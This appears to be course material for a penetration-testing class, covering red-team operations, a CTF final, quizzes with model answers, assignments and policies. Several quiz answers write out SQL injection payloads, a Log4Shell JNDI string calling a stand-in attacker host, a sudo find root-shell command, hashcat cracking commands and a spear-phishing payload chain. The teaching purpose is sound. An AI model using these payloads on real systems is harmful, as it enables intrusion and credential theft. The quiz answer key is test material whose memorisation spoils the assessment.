Child exploitation material (18 USC 2258A) requires NCMEC report. For other crimes, consult legal counsel. Document but do not continue accessing.
Out-of-scope system discovered during scan: stop, document, report to client, request written scope amendment. Unauthorized access is potentially criminal even within an authorized engagement.

class_schedule.topic: Red Team Operations and Advanced Adversary Simulation
learning_objectives: Distinguish red team operations from standard penetration testing
Design attack scenarios using MITRE ATT&CK
Implement C2 infrastructure with Sliver or Cobalt Strike
Coordinate purple team exercises with defenders
readings: Red Team Development and Operations Ch. 1-5

lecture_notes.introduction: Red team operations simulate realistic adversary campaigns over extended timeframes, testing the entire security program including detection, response, and recovery. While pentests ask 'can we get in?', red teams ask 'can defenders detect and contain a sophisticated adversary?' Engagements are objective-based (access CEO email, exfiltrate customer database), requiring OPSEC, custom tooling, and leadership coordination. MITRE ATT&CK provides common language for planning and evaluating coverage. Purple team exercises combine red and blue for maximum defensive improvement.
key_concepts: Red team vs pentest: scope-based/time-limited/vulnerability-focused versus objective-based/extended/detection-focused
ATT&CK: tactics (goals), techniques (methods), procedures (details). Selecting techniques matching simulated threat actors
C2 infrastructure: servers with redirectors, domain fronting, malleable profiles, operational security
Frameworks: Cobalt Strike (Beacon), Sliver (cross-platform), Mythic (multi-agent), Havoc (BOF support)
OPSEC: dedicated infrastructure, non-attributable payment, rotating domains/IPs, business-hours timing, artifact cleanup
Adversary emulation: recreating specific threat actor TTPs from intelligence reports
Purple team: red executes while blue observes SIEM/EDR, collaborative gap identification, real-time rule tuning
Reporting: narrative campaign format, timeline, detection assessment, ATT&CK mapping, improvement recommendations
Maturity: ATT&CK coverage, MTTD, MTTR metrics
lecture_notes.demonstration: Campaign planning with ATT&CK Navigator. Sliver C2 setup with HTTPS implant. Students design their own campaign targeting a specific objective.
setup_requirements: Sliver C2 on dedicated lab server
Lab with Wazuh SIEM and Sysmon for purple team

review.value: Visual mapping across matrix. Color-code: planned, executed, detected, missed. Produces visual coverage gap analysis.
Mimic legitimate traffic: HTTPS to CDN domains, business-hours timing, normal volumes, matching user-agents. Malleable profiles customize communication.
Maximum defensive improvement per hour. Red executes, blue checks detection. If missed, tune rule in real time. Iterate across ATT&CK techniques.
Dedicated infrastructure, non-attributable payment, redirectors, categorized domains, business hours, artifact cleanup.

class_schedule.topic: Capture the Flag Final Exercise and Course Synthesis
learning_objectives: Apply all penetration testing skills in a comprehensive CTF
Demonstrate end-to-end exploitation chains across multiple systems
Produce a professional report under time pressure
Reflect on ethical responsibilities of offensive security skills
readings: CTF strategy and time management guide
OSCP, GPEN, and career path resources

lecture_notes.introduction: The final CTF integrates every semester skill. The lab contains multiple systems across network segments requiring reconnaissance, scanning, exploitation, privilege escalation, pivoting, and post-exploitation. Unlike weekly labs, this demands technique chaining, time management, and strategic prioritization. The environment simulates a corporate network with DMZ, internal, and sensitive zones requiring multiple pivots. Students also produce a professional pentest report documenting methodology, findings, and exploitation chains.
key_concepts: CTF strategy: broad initial recon, service enumeration on promising hosts, prioritization by vulnerability and value, parallel workstreams
Attack chain integration: recon to exploitation to post-exploitation to pivoting to deeper access
Time management: budgets per target, knowing when to move on, progress tracking
Real-time documentation: command logs during execution rather than post-hoc reconstruction
Report under pressure: pre-built templates, real-time evidence capture, writing findings as discovered
Course synthesis: pentest lifecycle as complete methodology, how each week fits
Certifications: CompTIA PenTest+, eJPT, OSCP, GPEN, OSCE3/OSEP
Career ethics: responsible skill use, community contribution, mentoring, authorized purposes only
Continuous learning: CTFs, conferences, HackTheBox, TryHackMe, PentesterLab
lecture_notes.demonstration: First segment walkthrough: DMZ scan, web vulnerability identification, exploitation, foothold, pivot setup. Students continue independently.
setup_requirements: Flag submission system with real-time tracking

review.value: Pre-engagement -> Reconnaissance -> Scanning -> Exploitation -> Post-Exploitation -> Reporting. Each phase depends on thorough execution of previous.
Full scan of all targets. While scanning, OSINT on web apps. Prioritize obvious vulnerabilities. 30-minute rule: if stuck, move on and return later.
The report is what clients pay for. Brilliant exploitation with poor documentation is worth less than modest assessment with clear, actionable findings.
These skills cause significant harm if misused. Use only with explicit written authorization, minimize collateral impact, and improve security rather than undermine it.

questions.question: You are conducting a penetration test against a company's external perimeter. Your Nmap SYN scan shows port 443 with an expired SSL certificate and port 8443 running Apache Tomcat 9.0.30. Describe your next three steps with specific tools and explain why.
questions.answer: Step 1: Enumerate SSL/TLS on port 443 using testssl.sh to identify weak ciphers and deprecated protocols revealing cryptographic weaknesses. Step 2: Run NSE scripts (http-enum, http-methods, http-robots.txt) and Nikto against both ports for misconfiguration scanning. Step 3: Research CVE-2020-1938 (Ghostcat) for Tomcat 9.0.30, attempt /manager with default credentials, spider with Burp Suite for hidden endpoints.

rubric.key: SSL/TLS enumeration with tools and rationale

questions.question: Explain the difference between SYN scan (-sS) and TCP connect scan (-sT). When must you use -sT, and what are the detection implications of each?
questions.answer: SYN scan sends SYN, awaits SYN-ACK/RST without completing handshake, requires root for raw sockets. TCP connect completes full handshake via OS connect() call. Must use -sT as non-root, through SOCKS proxies, or without raw socket support. -sT creates full connections logged by applications; -sS avoids application logs but is detected by network IDS.

questions.question: Describe three OSINT techniques to enumerate valid email addresses for a Microsoft 365 target without interacting with their infrastructure.
questions.answer: 1: LinkedIn employee enumeration combined with email format determination from public correspondence. 2: Certificate Transparency (crt.sh) and DNS analysis including SPF/DMARC records revealing infrastructure. 3: Google dorks for leaked addresses in paste sites and GitHub repos, plus breach database domain searches.

questions.question: Given PHP: $query = "SELECT * FROM users WHERE id = " . $_GET['id']; Show UNION-based, blind boolean, and time-based SQL injection payloads for admin password extraction. Explain when each is preferred.
questions.answer: UNION: ?id=1 UNION SELECT username,password,NULL FROM users WHERE username='admin'-- (when results displayed). Boolean: ?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- (when true/false changes page). Time-based: ?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)-- (when responses are identical, only timing differs).

questions.question: Meterpreter on Windows 10 as standard user, no kernel exploits available. Describe three privilege escalation techniques with exact commands and prerequisites.
questions.answer: 1: Unquoted service paths via post/windows/gather/enum_unquoted_service_paths, check write permissions, msfvenom payload, upload and restart service (requires writable path directory). 2: Token impersonation via getprivs checking SeImpersonatePrivilege, upload PrintSpoofer64.exe, execute for SYSTEM (requires the privilege). 3: Stored credentials via credential_collector, cmdkey /list, GPP passwords in SYSVOL (requires cached credentials).

questions.question: A scanner reports Log4Shell (CVE-2021-44228). Describe three verification steps before confirming the finding, and explain possible false positive causes.
questions.answer: 1: Confirm Log4j 2.0-2.14.1 usage via headers and fingerprints. 2: Inject ${jndi:ldap://attacker/test} into inputs and monitor DNS callback. 3: Verify outbound connectivity and check for JVM mitigation flags. False positives: Java flagged without Log4j, Log4j 1.x (different vulnerability), vendor backported fix, WAF/JVM flags mitigate.

questions.question: You extracted aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 from Windows. Identify hash type, explain both parts, write the Hashcat crack command, and estimate GPU crack time.
questions.answer: NTLM in LM:NT format. First half is empty LM hash (LM disabled). Second half is NT hash (MD4 of Unicode password). hashcat -m 1000 -a 0 -r /usr/share/hashcat/rules/best64.rule e19ccf75ee54e06b06a5907af13cef42 /usr/share/wordlists/rockyou.txt -o cracked.txt. At 65 GH/s on RTX 4090, RockYou + best64 (~1.1B candidates) completes in under 1 second. Hash also usable for Pass-the-Hash.

questions.question: Why is WPA2-PSK vulnerable to offline dictionary attacks while WPA3-SAE is not? Include the cryptographic mechanism difference and one WPA3 transition mode vulnerability.
questions.answer: WPA2-PSK: PMK derived deterministically from passphrase/SSID via PBKDF2-SHA1. Captured handshake allows offline testing of candidate PMKs. WPA3-SAE: Dragonfly PAKE uses interactive zero-knowledge proof; each handshake is unique and capturing one does not enable offline testing. Transition mode: attacker spoofs WPA2-only beacon forcing downgrade, captures WPA2 handshake for offline cracking (Dragonblood CVE-2019-9494).

questions.question: Organization requires 8-char minimum with upper, lower, and number. Write Hashcat mask for the common Capital+lowercase+digit pattern, calculate keyspace, and explain why the policy fails.
questions.answer: Mask: ?u?l?l?l?l?l?l?d. Keyspace: 26*26^6*10 = ~80 billion. hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d. At 65 GH/s (NTLM), exhausted in ~1.2 seconds. Policy fails: 8 chars too short, complexity rules create predictable patterns (Password1), keyspace trivial for GPUs. NIST 800-63B recommends 12+ chars, no complexity, breach database checks, MFA.

quizzes.topic: Post-Exploitation, Privilege Escalation, and Social Engineering

questions.question: You have www-data shell on Linux. sudo -l shows (ALL) NOPASSWD: /usr/bin/find. How do you escalate to root, why does this misconfiguration exist, and what is the secure alternative?
questions.answer: Run: sudo find /tmp -name x -exec /bin/bash \; which spawns root bash since find -exec inherits sudo privileges. Exists because admins granted find for file searches without considering -exec allows arbitrary commands. Secure: (1) grant sudo to a specific script, (2) NOEXEC tag prevents -exec subcommands, (3) capabilities (cap_dac_read_search) for search without root.

questions.question: Design a spear-phish against a CFO. OSINT: company uses M365, CFO attended cybersecurity conference, fiscal year ends next month. Describe pretext, payload delivery, and detection indicators.
questions.answer: Pretext: Conference organizer sending CFO Benchmarking Report (leverages real event + fiscal timing). Email references specific sessions with deadline. Payload: HTML smuggling via cloned conference site constructing ISO with LNK disguised as PDF executing PowerShell downloader. Detection: sender domain mismatch, DMARC failure, link URL differs from real site, urgency/unsolicited attachment flags, ISO/LNK unusual for business documents.

questions.question: Compare Pass-the-Hash and Pass-the-Ticket in AD: credential material, how obtained, tools, and specific defense for each.
questions.answer: PtH: NTLM hash used in challenge-response. Obtained from LSASS (Mimikatz) or SAM. Tools: Mimikatz pth, CrackMapExec -H, Impacket -hashes. Defense: disable NTLM, Credential Guard, LAPS. PtT: Kerberos TGT/TGS bearer tokens. Obtained from LSASS (kerberos::list) or forged with krbtgt hash. Tools: Mimikatz kerberos::ptt, Rubeus. Defense: short ticket lifetimes, rotate krbtgt twice, Protected Users group.

quizzes.topic: Report Writing, Legal Framework, and Red Team Operations

questions.question: Write the executive summary paragraph for unauthenticated SQL injection on customer portal extracting 50,000 records. Must be understandable by a non-technical CEO.
questions.answer: During our security assessment, we discovered a critical vulnerability in the customer portal allowing complete database access without any login credentials. By manipulating the search function, we retrieved 50,000 customer records including names, emails, and password data. Although passwords were encrypted, the method is weak and approximately 70% could be recovered within hours. If exploited, this could require customer notification under breach laws, regulatory fines, reputational damage, and credential attacks. We recommend immediate remediation per our technical instructions and legal counsel engagement.

questions.question: Map a red team chain from T1566.001 (Spearphishing) to domain controller access using 5+ additional ATT&CK techniques with IDs, tactics, and tools.
questions.answer: (1) T1566.001 Initial Access: macro Excel downloads Sliver implant. (2) T1059.001 Execution: PowerShell download cradle with AMSI bypass. (3) T1053.005 Persistence: schtasks for daily execution. (4) T1055.001 Defense Evasion: DLL injection into explorer.exe via Sliver migrate. (5) T1003.001 Credential Access: procdump lsass.exe + Mimikatz offline. (6) T1021.002 Lateral Movement: Impacket psexec with domain admin hash to DC.

questions.question: A client asks to include their competitor's website in the pentest scope. Why must you refuse, what are the legal issues, and how do you handle it professionally?
questions.answer: Client does not own/authorize competitor systems. Testing violates CFAA as unauthorized access. Also tortious interference and state computer crime. Handle: (1) explain scope limited to owned/authorized systems, (2) document request and refusal, (3) offer passive OSINT alternative, (4) if insisted, terminate engagement, (5) RoE should prohibit out-of-scope testing.

major_assignments.title: Reconnaissance and Vulnerability Assessment Report
major_assignments.description: Conduct comprehensive reconnaissance and vulnerability assessment against six lab hosts across two segments. Produce a professional report with prioritized findings and remediation.
objectives: Execute thorough passive and active reconnaissance
Perform comprehensive scanning and service enumeration
Validate vulnerabilities using automated and manual techniques
deliverables: Vulnerability report with CVSS, evidence, impact, and remediation per finding
Attack surface map of hosts, services, and vectors

criteria: Complete host and service discovery across both segments
True positive vs false positive differentiation

major_assignments.title: Full-Scope Penetration Test
major_assignments.description: Full penetration test against eight hosts across three segments (DMZ, internal, sensitive). Demonstrate exploitation, escalation, lateral movement, and data access. PTES-compliant report.
objectives: Execute all pentest phases against multi-segment network
Demonstrate exploitation, escalation, and lateral movement
Pivot through compromised hosts to internal segments
Produce professional report with executive and technical sections
deliverables: Pentest report with executive summary and technical findings
Attack path diagram showing full exploitation chain

criteria: Privilege escalation on at least two OS types
Evidence, impact, and remediation per finding

major_assignments.title: Social Engineering Campaign Assessment
major_assignments.description: Design and execute multi-vector social engineering assessment against simulated organization. Develop phishing campaigns, vishing scripts, and physical plans. Analyze results and recommend training.
objectives: Execute attacks with GoPhish tracking and metrics
Develop vishing and physical social engineering scenarios
Analyze results and recommend awareness training
deliverables: Assessment report with methodology and results
Phishing templates with OSINT pretext justification
Metrics analysis: open, click, submission, reporting rates

weekly_quizzes.description: Five quizzes assessing penetration testing concepts, tools, and methodology

lab_assignments.description: Hands-on weekly labs covering reconnaissance, exploitation, post-exploitation, and wireless

major_assignments.description: Three assignments: vulnerability assessment report, full-scope pentest, social engineering campaign

midterm_examination.description: Practical midterm: timed pentest of lab environment covering weeks 1-7

final_project.description: Capture-the-flag final with comprehensive penetration test report

course_policies.attendance: Attendance mandatory for all lab sessions. More than 2 unexcused absences may result in course failure.
course_policies.late_submissions: 10% penalty per day late. No submissions after 5 days without prior arrangement.
course_policies.collaboration: Lab discussion permitted; exploitation, evidence, and reports must be individual work. Sharing exploits or flags is academic dishonesty.
course_policies.academic_integrity: All testing within authorized lab environment only. External system testing without authorization violates CFAA and is grounds for expulsion.
course_policies.technology_requirements: Laptop running Kali Linux VM (8GB RAM minimum, 100GB disk). Monitor-mode wireless adapter required for Week 8.
